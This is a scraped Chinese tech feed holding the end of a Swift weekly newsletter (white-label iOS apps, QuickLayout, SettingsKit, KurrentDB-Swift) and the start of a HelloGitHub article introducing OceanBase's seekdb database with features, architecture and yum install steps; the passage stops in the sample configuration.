<p>白标产品（White-Label）指的是一个架构灵活、可在不同客户之间复用的通用 App 框架，能够按需更换品牌皮肤与功能配置（例如通用的订餐 App 模板）。<a href="https://link.juejin.cn?target=https%3A%2F%2Fx.com%2FPawelKozielecki" target="_blank" title="https://x.com/PawelKozielecki" ref="nofollow noopener noreferrer">Pawel Kozielecki</a> 在这篇长文中系统梳理了 iOS White-Label 应用的演进路线，将其划分为三个阶段：基础品牌定制、自定义 UI/UX，以及完全模块化。在此基础上，他对比了三种常见实现策略——多 Target、资源复制、模块化架构，并指出随着客户数量与差异化需求增长，真正能够长期扩展、避免维护失控的方案只有模块化（Modular Architecture）。文章还结合大量实战细节，讨论了审核、签名、资源与配置分层、测试与 CI 等白标项目在规模化过程中的关键挑战。</p>
<h2 data-id="heading-9">工具</h2>
<h3 data-id="heading-10"><a href="https://link.juejin.cn?target=https%3A%2F%2Fl.fatbobman.com%2Fw0112-09" target="_blank" title="https://l.fatbobman.com/w0112-09" ref="nofollow noopener noreferrer">QuickLayout: 声明式 UIKit 布局库</a></h3>
<p>既然 UIKit 已经可以无缝集成 Observation 了，那么以 SwiftUI 风格编写布局代码也就不足为奇了。由 <a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.linkedin.com%2Fin%2Fconstantine-fry%2F" target="_blank" title="https://www.linkedin.com/in/constantine-fry/" ref="nofollow noopener noreferrer">Constantine Fry</a> 开发的 QuickLayout 便提供了这样的能力，其已被 Meta 在 Instagram 的核心功能中使用。你可以直接以如下的方式进行布局:</p>
<pre><code class="hljs language-swift" lang="swift"><span class="hljs-keyword">import</span> QuickLayout
​
<span class="hljs-meta">@QuickLayout</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">MyCellView</span>: <span class="hljs-title class_">UIView</span> {
​
  <span class="hljs-keyword">let</span> titleLabel <span class="hljs-operator">=</span> <span class="hljs-type">UILabel</span>()
  <span class="hljs-keyword">let</span> subtitleLabel <span class="hljs-operator">=</span> <span class="hljs-type">UILabel</span>()
​
  <span class="hljs-keyword">var</span> body: <span class="hljs-type">Layout</span> {
    <span class="hljs-type">HStack</span> {
      <span class="hljs-type">VStack</span>(alignment: .leading) {
        titleLabel
        <span class="hljs-type">Spacer</span>(<span class="hljs-number">4</span>)
        subtitleLabel
      }
      <span class="hljs-type">Spacer</span>()
    }
    .padding(.horizontal, <span class="hljs-number">16</span>)
    .padding(.vertical, <span class="hljs-number">8</span>)
  }
}
</code></pre>
<p>UIKit 和 SwiftUI 从来不是对立面，而是两套可互相借鉴的 UI 思维模型。现阶段 SwiftUI 的优势在于抽象与一致性，而高性能、精细控制、工具链支持等仍是 UIKit 的特长。</p>
<hr/>
<h3 data-id="heading-11"><a href="https://link.juejin.cn?target=https%3A%2F%2Fl.fatbobman.com%2Fw0112-10" target="_blank" title="https://l.fatbobman.com/w0112-10" ref="nofollow noopener noreferrer">SettingsKit</a></h3>
<p>几乎所有应用都需要设置界面，虽然编写难度不高，但当选项不断增加时，维护成本也会随之上升。<a href="https://link.juejin.cn?target=https%3A%2F%2Fx.com%2FAetherAurelia" target="_blank" title="https://x.com/AetherAurelia" ref="nofollow noopener noreferrer">Aether</a> 开发的 SettingsKit 正是为此而生。它让 SwiftUI 开发者可以快速构建一个可扩展、样式统一、并带有搜索能力的设置界面，并内置分组、卡片、侧栏等多种风格，适用于中大型设置模块的搭建。</p>
<hr/>
<h3 data-id="heading-12"><a href="https://link.juejin.cn?target=https%3A%2F%2Fl.fatbobman.com%2Fw0112-11" target="_blank" title="https://l.fatbobman.com/w0112-11" ref="nofollow noopener noreferrer">KurrentDB-Swift</a></h3>
<p>Kurrent（原 EventStoreDB）是一款专门用于事件存储的数据库，它不仅保存系统的最新状态，还能完整记录每一次变化的历史，非常适用于金融、物流、零售、电商、SaaS 等需要强可追溯性的场景。作为 KurrentDB 的 Swift 客户端库，由 <a href="https://link.juejin.cn?target=https%3A%2F%2Fx.com%2Fgradyzhuo" target="_blank" title="https://x.com/gradyzhuo" ref="nofollow noopener noreferrer">Grady Zhuo</a> 开发的 KurrentDB-Swift 支持 Swift 6、async/await 流式订阅与事件读取，补上了 Swift 生态在 Event Sourcing 领域长期缺乏成熟工具的空白。</p>
<h2 data-id="heading-13">往期内容</h2>
<ul>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Ffatbobman.com%2Fzh%2Fweekly%2Fissue-111%2F" target="_blank" title="https://fatbobman.com/zh/weekly/issue-111/" ref="nofollow noopener noreferrer">Homebrew 5.0：并行加速、MCP 加持，与 Intel 的最后倒计时 - #111</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Ffatbobman.com%2Fzh%2Fweekly%2Fissue-110%2F" target="_blank" title="https://fatbobman.com/zh/weekly/issue-110/" ref="nofollow noopener noreferrer">Skip Fuse现在对独立开发者免费！- #110</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fhttps%3A%2F%2Ffatbobman.com%2Fzh%2Fweekly%2Fissue-109%2F" target="_blank" title="https://https://fatbobman.com/zh/weekly/issue-109/" ref="nofollow noopener noreferrer">惊险但幸运，两次！ - #109</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Ffatbobman.com%2Fzh%2Fweekly%2Fissue-108%2F" target="_blank" title="https://fatbobman.com/zh/weekly/issue-108/" ref="nofollow noopener noreferrer">Swift 官方发布 Android SDK - #108</a></li>
</ul>
<h2 data-id="heading-14">💝 支持与反馈</h2>
<p>如果本期周报对你有帮助，请：</p>
<ul>
<li>👍 <strong>点赞</strong> - 让更多开发者看到</li>
<li>💬 <strong>评论</strong> - 分享你的看法或问题</li>
<li>🔄 <strong>转发</strong> - 帮助同行共同成长</li>
</ul>
<hr/>
<blockquote>
<p>🚀 <strong>拓展 Swift 视野</strong></p>
<ul>
<li><strong>📮 邮件订阅</strong> | <a href="https://link.juejin.cn?target=https%3A%2F%2Fweekly.fatbobman.com%2Fwelcome" target="_blank" title="https://weekly.fatbobman.com/welcome" ref="nofollow noopener noreferrer">weekly.fatbobman.com</a> 获取独家技术洞察</li>
<li><strong>👥 开发者社区</strong> | <a href="https://link.juejin.cn?target=https%3A%2F%2Fdiscord.com%2Finvite%2F7FedN5E2QQ" target="_blank" title="https://discord.com/invite/7FedN5E2QQ" ref="nofollow noopener noreferrer">Discord</a> 实时交流开发经验</li>
<li><strong>📚 原创教程</strong> | <a href="https://link.juejin.cn?target=http%3A%2F%2Ffatbobman.com" target="_blank" title="http://fatbobman.com" ref="nofollow noopener noreferrer">fatbobman.com</a> 学习 Swift/SwiftUI 最佳实践</li>
</ul>
</blockquote></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[比 MySQL 轻，比 SQLite 强：终于有人把 AI 数据库做对了]]></title>    <link>https://juejin.cn/post/7576197876716748838</link>    <guid>https://juejin.cn/post/7576197876716748838</guid>    <pubDate>2025-11-25T00:19:55.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7576197876716748838" data-draft-id="7576105442214330418" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="比 MySQL 轻，比 SQLite 强：终于有人把 AI 数据库做对了"/> <meta itemprop="keywords" content="GitHub,开源,数据库"/> <meta itemprop="datePublished" content="2025-11-25T00:19:55.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="HelloGitHub"/> <meta itemprop="url" content="https://juejin.cn/user/1574156384091320"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            比 MySQL 轻，比 SQLite 强：终于有人把 AI 数据库做对了
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1574156384091320/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    HelloGitHub
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-25T00:19:55.000Z" title="Tue Nov 25 2025 00:19:55 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-25
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读9分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/19f57e8e53b549d2a5fa1eafd945fccb~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSGVsbG9HaXRIdWI=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764634795&amp;x-signature=D9%2FsddVGJGhrzo7o7qk7aloo6P8%3D" alt="" loading="lazy"/></p>
<p>前几天，我看到了一个来自 Turso 创始人 Pekka 的观点：</p>
<blockquote>
<p>SQLite 被认为是 AI agent 的理想数据库，因为它轻量级且适用于 AI agent 的各种场景，但仍然需要进化。</p>
</blockquote>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/35d656b3e981498f9ebdcbcd8a127606~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSGVsbG9HaXRIdWI=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764634795&amp;x-signature=S2tn8ybJo6m058%2BxmEtikklnojk%3D" alt="" loading="lazy"/></p>
<p>评论区里也有意思，有人会和大家分享自己为了 SQLite 的进化做了哪些事情（比如开源了 Super SQLite 之类的项目），也有人会推荐有哪些 SQLite 的进化版产品，并和大家讨论这些产品的优劣。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/eaea769ca6d24bcc919823f5214e32d9~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSGVsbG9HaXRIdWI=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764634795&amp;x-signature=sCQbdeIC9PdWvm9pnQELxr03n3A%3D" alt="" loading="lazy"/></p>
<p>实际上，AI 应用开发者对轻量级数据库的诉求，远远不止 AI Agent 这一个场景。那些在 Web 时代和移动互联网时代支撑了万亿级应用的传统数据库，如今在面对 AI 应用的敏捷、轻量、高频迭代的需求时，都纷纷开始暴露出它们的水土不服。</p>
<p>除了传统数据库几个最明显的问题 —— <strong>部署复杂度高、资源占用多、过度设计影响执行效率</strong> 以外，很多 AI 应用都会把数据和模型紧密结合，在设备端（如手机、物联网设备）实现本地化运行，传统数据库通过客户端远程连接服务器的模式，也无法满足这种嵌入式，甚至离线嵌入式的需求。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/91fb112cc10549f0aa304a3ad341d3da~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSGVsbG9HaXRIdWI=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764634795&amp;x-signature=sq6yHywgjveQ9Uv0FuuFYSUMX4Y%3D" alt="" loading="lazy"/></p>
<p>为了让 AI 开发者不浪费太多时间在与数据基础设施的搏斗上，而是能够专注于 AI 算法与应用逻辑本身。我们需要一种新型数据库，能够将自己从这种无谓的消耗中解放出来。</p>
<h2 data-id="heading-0">0x01. seekdb 的来龙去脉</h2>
<p>OceanBase 刚开始只是负责淘宝和支付宝的各种交易支付相关业务，然后是各种银行和金融机构，接下来是从泛互联网行业扩展到各行各业，详见：<a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%2FFng44Ft1gNKKP2mYK1vsew" target="_blank" title="https://mp.weixin.qq.com/s/Fng44Ft1gNKKP2mYK1vsew" ref="nofollow noopener noreferrer">《开源 4 年、打磨 15 年、300 万行代码的开源项目》</a>。</p>
<p>但在 AI 时代，对于开发者，类似于 SQLite 这种轻量级数据库的能力非常有限（向量能力和传统 SQL 能力难以兼得），而传统数据库又有部署复杂度高、资源占用多等问题。这两类数据库对于开发者来说，都不够友好。</p>
<p>因此，OceanBase 专门为 AI 时代的开发者，打造了一个开源免费、轻量易用、拥有强大 AI 搜索能力的数据库 —— <strong>seekdb</strong>。个人笔记本安装无压力，让大家只要有机器，就能跑 OB！</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/fb24ebddac6f46579eebf998f5984dde~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSGVsbG9HaXRIdWI=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764634795&amp;x-signature=%2BRrmzUB7F0L9ADAK7XdQth5P4%2Fw%3D" alt="" loading="lazy"/></p>
<blockquote>
<p>GitHub 地址：<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Foceanbase%2Fseekdb" target="_blank" title="https://github.com/oceanbase/seekdb" ref="nofollow noopener noreferrer">github.com/oceanbase/s…</a></p>
</blockquote>
<h2 data-id="heading-1">0x10. seekdb 简介</h2>
<p><strong>seekdb</strong> 是 OceanBase 专门为开发者打造的一款开箱即用、轻量级的数据库产品，专注于为 AI 应用提供高效的混合搜索能力，支持向量、全文及多模数据的统一存储与检索，是构建 AI 应用的新选择。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f5db2ad4595541008f207eb1a6bade25~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSGVsbG9HaXRIdWI=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764634795&amp;x-signature=nlpGMKvs34NjEGJ6JmgfdhJ0srI%3D" alt="" loading="lazy"/></p>
<p>seekdb 在继承了淘宝和支付宝背后的 OceanBase 数据库核心引擎高性能优势与 MySQL 全面兼容特性的基础上，通过深度优化数据搜索架构，为开发者提供了更符合 AI 应用数据处理需求的各项能力。</p>
<h3 data-id="heading-2">产品能力矩阵对比</h3>






























































































































<table><thead><tr><th align="left">特性</th><th align="center">seekdb</th><th align="center">OceanBase</th><th align="center">Chroma</th><th align="center">Milvus</th><th align="center">MySQL 9.0</th><th align="center">PostgreSQL + pgvector</th><th align="center">DuckDB</th><th align="center">Elasticsearch</th></tr></thead><tbody><tr><td align="left"><strong>嵌入式数据库</strong></td><td align="center">✅</td><td align="center">❌</td><td align="center">✅</td><td align="center">✅</td><td align="center">❌</td><td align="center">❌</td><td align="center">✅</td><td align="center">❌</td></tr><tr><td align="left"><strong>单机数据库</strong></td><td align="center">✅</td><td align="center">✅</td><td align="center">✅</td><td align="center">✅</td><td align="center">✅</td><td align="center">✅</td><td align="center">✅</td><td align="center">✅</td></tr><tr><td align="left"><strong>分布式数据库</strong></td><td align="center">❌</td><td align="center">✅</td><td align="center">❌</td><td align="center">✅</td><td align="center">❌</td><td align="center">❌</td><td align="center">❌</td><td align="center">✅</td></tr><tr><td align="left"><strong>MySQL 兼容</strong></td><td align="center">✅</td><td align="center">✅</td><td align="center">❌</td><td align="center">❌</td><td align="center">✅</td><td align="center">❌</td><td align="center">✅</td><td align="center">❌</td></tr><tr><td align="left"><strong>向量搜索</strong></td><td align="center">✅</td><td align="center">✅</td><td align="center">✅</td><td align="center">✅</td><td align="center">❌</td><td align="center">✅</td><td align="center">✅</td><td align="center">✅</td></tr><tr><td align="left"><strong>全文检索</strong></td><td align="center">✅</td><td align="center">✅</td><td align="center">✅</td><td align="center">⚠️</td><td align="center">✅</td><td align="center">✅</td><td align="center">✅</td><td align="center">✅</td></tr><tr><td align="left"><strong>混合搜索</strong></td><td align="center">✅</td><td align="center">✅</td><td align="center">✅</td><td align="center">✅</td><td align="center">❌</td><td align="center">⚠️</td><td align="center">❌</td><td align="center">✅</td></tr><tr><td align="left"><strong>OLTP</strong></td><td align="center">✅</td><td align="center">✅</td><td align="center">❌</td><td align="center">❌</td><td align="center">✅</td><td align="center">✅</td><td align="center">❌</td><td align="center">❌</td></tr><tr><td align="left"><strong>OLAP</strong></td><td align="center">✅</td><td align="center">✅</td><td align="center">❌</td><td align="center">❌</td><td align="center">❌</td><td align="center">✅</td><td align="center">✅</td><td align="center">⚠️</td></tr><tr><td align="left"><strong>开源协议</strong></td><td align="center">Apache 2.0</td><td align="center">MulanPubL 2.0</td><td align="center">Apache 2.0</td><td align="center">Apache 2.0</td><td align="center">GPL 2.0</td><td align="center">PostgreSQL License</td><td align="center">MIT</td><td align="center">AGPLv3+ SSPLv1+ Elastic 2.0</td></tr></tbody></table>
<blockquote>
<p>MySQL 8.0 移除了嵌入式能力</p>
</blockquote>
<h3 data-id="heading-3">seekdb 的适用场景</h3>
<ul>
<li><strong>RAG 应用</strong>：面向以智能聊天机器人、知识库、领域专家系统为代表的 RAG 场景，seekdb 支持了完整的 RAG Pipeline 解决方案。内置文档解析处理功能，集成向量嵌入（Embedding）、重排序（Rerank）及大语言模型（LLM），支持向量/全文/标量混合搜索，在一个数据库实例内实现 <strong>Doc In Data Out</strong>。</li>
<li><strong>AI 辅助编程</strong>：面向 AI 辅助编程场景，seekdb 支持对代码仓库构建向量和全文索引，基于代码关键词或代码语义，进行高效的代码搜索和生成补全。</li>
<li><strong>AI Agent 平台类应用</strong>：面向 AI Agent 开发场景，seekdb 提供了快速启动和嵌入式部署能力，支持被快速拉起提供服务。提供高频增删改和实时查询能力，避免数据库性能瓶颈引起 AI 开发效率降低的问题。提供向量搜索、全文搜索及混合搜索特性和灵活的元数据管理能力，结合会话管理与记忆存储能力，无需再引入其他库就可快速构建 AI Agent。提供 MCP Server 组件，无缝接入 AI 生态。</li>
<li><strong>语义搜索引擎</strong>：面向以电商商品搜索和推荐、多媒体内容检索、图片搜索等语义搜索场景，seekdb 支持对接主流向量嵌入模型并提供了向量搜索能力。同时提供了 Hybrid Index 功能，支持基于文本查询条件进行语义搜索，对用户屏蔽向量嵌入和查询结果 Rerank 的复杂流程。</li>
<li><strong>MySQL 应用现代化和 AI 化升级</strong>：seekdb 继承了 OceanBase 单机存储引擎、执行引擎、事务引擎、高级查询优化器的完整能力，高度兼容 MySQL，并在此基础上扩展 AI 能力。小规格可用于物联网边缘设备数据采集、小型应用开发和实验教学等场景，中大规格可用于各行业 OLTP、HTAP 或 AI 业务场景。</li>
</ul>
<h3 data-id="heading-4">seekdb 的产品架构</h3>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/0c0aecd44d5646d8aee38fa0fc4eae7d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSGVsbG9HaXRIdWI=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764634795&amp;x-signature=x3GUudtrz0ITBIxXTkA0BEfA0rM%3D" alt="" loading="lazy"/></p>
<ul>
<li><strong>部署模式</strong>：支持 Client/Server 和嵌入式两种部署模式。嵌入式模式下可将 seekdb 直接集成进 Python 应用，便于进行个人开发。</li>
<li><strong>具有 ACID 事务语义的存储层</strong>：基于 LSM-Tree 架构的行存列存一体化存储引擎，自研高效的编码压缩机制降低存储成本。支持数据高频实时写入，和面向不同负载的高性能查询。</li>
<li><strong>多模数据与索引层</strong>：支持基础类型，向量、大文本、JSON 、GIS、Array 等多模数据类型，并提供高效的索引支持。包括 HNSW / IVF 向量索引及索引量化算法，覆盖多种分词器和查询模式的基于 BM25 相关性计算算法的全文索引，适用于语义搜索的混合索引，及 JSON 多值索引、主键和二级索引、GIS 索引等。</li>
<li><strong>支持混合负载的多模计算层</strong>：支持向量、全文、标量等条件的混合搜索。提供 AI Function 能力，实现库内实时推理。支持完整的 ACID 事务特性及基于 MVCC 的多版本并发访问能力，提供高级查询优化器和具备向量化执行能力的高效执行引擎。</li>
<li><strong>统一应用接口</strong>：兼容 MySQL 原生驱动，提供基于 SQL 的支持多模数据的统一查询语言。并在此基础上提供了面向开发者更加友好的向量库/混搜 SDK。适配 LangChain、LlamaIndex、Dify 等 AI 应用开发框架。提供 MCP Server，无缝接入 AI 生态。</li>
</ul>
<h3 data-id="heading-5">seekdb 的核心特性</h3>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/6fd01ba9f0714c84b779540f26a20538~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSGVsbG9HaXRIdWI=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764634795&amp;x-signature=LVVDo6VRxeKlIZnBSz%2BRBsVOzIk%3D" alt="" loading="lazy"/></p>
<ol>
<li><strong>开箱即用，极速开发，易学易用</strong>：单点架构设计，无其他组件依赖。支持 yum、docker、windows/macos 桌面版部署以及原生 Python 嵌入式集成。</li>
<li><strong>支持 1C2G 小规格，垂直弹性扩缩容</strong>：服务端 1 核 CPU + 2GB 内存即可跑 VectorDBBench Performance1536D50K。</li>
<li><strong>高性能向量索引、全文索引，支持向量、全文、标量混合搜索</strong>
<ul>
<li><strong>向量搜索</strong>：支持高达 16,000 维向量存储，兼容 L2、内积、余弦相似度。</li>
<li><strong>全文搜索</strong>：基于 BM25 算法，提供 Space、Beng、Ngram、IK、Jieba 等多种分词器。</li>
<li><strong>混合搜索</strong>：一条 SQL 完成多路查询与重排序。</li>
</ul>
</li>
<li><strong>混搜场景升级，基于 Hybrid Index 指定文本也可进行语义搜索</strong>：只需写入文本数据，系统自动进行 Embedding 并生成向量索引，查询时仅需指定文本搜索条件。</li>
<li><strong>无缝对接各类模型，内置 AI Function 实现库内实时推理</strong>：通过 <code>DBMS_AI_SERVICE</code> 系统包实现模型注册和管理。内置 <code>AI_COMPLETE</code>、<code>AI_PROMPT</code>、<code>AI_EMBED</code>、<code>AI_RERANK</code> 等函数。</li>
<li><strong>基于 JSON 的动态 Schema</strong>：支持 JSON 数据类型及动态 Schema，提供 JSON 函数索引、多值索引。</li>
<li><strong>数据实时写入，实时可查</strong>：基于 LSM-Tree，数据入库成功立即可查，同步构建各类索引。</li>
<li><strong>兼容 MySQL 不止于 MySQL，支撑 HTAP 混合负载</strong>：深度兼容 MySQL 语法协议，一个实例同时支持联机交易和实时分析。</li>
</ol>
<h2 data-id="heading-6">0x11. 快速部署 seekdb 体验环境</h2>
<blockquote>
<p>服务器配置要求详见官方文档：<a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.oceanbase.ai%2Fdocs%2Fzh-CN%2Fdeploy-seekdb-testing-environment" target="_blank" title="https://www.oceanbase.ai/docs/zh-CN/deploy-seekdb-testing-environment" ref="nofollow noopener noreferrer">deploy-seekdb-testing-environment</a></p>
</blockquote>
<h3 data-id="heading-7">1. 使用 yum install 快速部署</h3>
<p><strong>添加 seekdb 镜像源：</strong></p>
<pre><code class="hljs language-bash" lang="bash">sudo yum-config-manager --add-repo https://mirrors.aliyun.com/oceanbase/OceanBase.repo
</code></pre>
<p><strong>安装 seekdb 和 obclient 客户端：</strong></p>
<pre><code class="hljs language-bash" lang="bash">sudo yum install seekdb obclient
</code></pre>
<p>如果在启动前需要更改配置，可以直接修改 <code>/etc/oceanbase/seekdb.cnf</code>，配置项很少可按需修改。</p>
<p><strong>建议 <code>cpu_count</code> 和 <code>memory_limit</code> 最好大于 1C2G，亲测 1C1G 也 No Problem。</strong></p>
<pre><code class="hljs language-ini" lang="ini"><span class="hljs-comment"># 示例配置</span>
<span class="hljs-attr">port</span>=<span class="hljs-number">1234</span>
<span class="hljs-attr">base-dir</span>=/var/lib/oceanbase
<span class="hljs-attr">data-dir</span>=/var/lib/oceanbase/store
<span class="hljs-attr">redo-dir</span>=/var/lib/oceanbase/store/redo
<span class="hljs-attr">datafile_size</span>=<span class="hljs-number">2</span>G
<span class="hljs-attr">datafile_next</span>=<span class="hljs-number">2</span>G
<span class="hljs-attr">datafile_maxsize</span>=<span class="hljs-number">50</span>G
<span class="hljs-attr">cpu_count</span>=<span class="hljs-number">4</span>
<span class="hljs-attr">memory_limit</span>=<span class="hljs-number">2</span>G
